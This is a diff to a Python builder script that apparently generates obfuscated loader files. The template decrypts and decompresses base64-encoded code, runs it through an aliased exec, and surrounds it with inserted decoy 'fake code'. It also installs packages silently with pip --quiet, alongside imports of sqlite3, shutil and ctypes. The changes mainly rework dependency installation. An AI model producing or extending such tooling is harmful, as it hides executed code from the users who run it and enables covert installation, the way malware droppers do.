@@ -150,15 +150,11 @@ for modl in requirements:
         time.sleep(3)
 
     
-ModuleRequirements = [["cryptography", "cryptography"]]
-for module in ModuleRequirements:
-    try:        
-        __import__(module[0])
-    except:
-        try:
-            subprocess.Popen(executable + " -m pip install pycrytodome --quiet", shell=True)
-        except:
-            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+try:        
+    __import__("cryptography")
+except:
+    subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
+
 
 import requests
 
@@ -179,6 +175,7 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
 {e}(decompressed_code)
 {all_fake_code}
 '''
+
     name = args.name+'.py'
     s = base64.b64encode(obfuscated_code.encode('utf-8'))
     aw = random_class_name()    
@@ -189,16 +186,6 @@ from sys import executable, stderr
 {all_fake_code}
 import ctypes;import base64,subprocess,sqlite3,json,shutil
 import time
-ModuleRequirements = [["cryptography", "cryptography"]]
-
-for module in ModuleRequirements:
-    try:        
-        __import__(module[0])
-    except:
-        try:
-            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
-        except:
-            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
 
 requirements = [
     ["requests", "requests"],
@@ -210,8 +197,6 @@ for modl in requirements:
         subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
         time.sleep(3)
         
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
 from json import loads, dumps
 from urllib.request import Request, urlopen
@@ -230,9 +215,10 @@ try:
 except:
     subprocess.run("python -m pip install requests", shell=True)
 
-
 import requests
 from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 {all_fake_code}
 {e} = exec
 {all_fake_code}
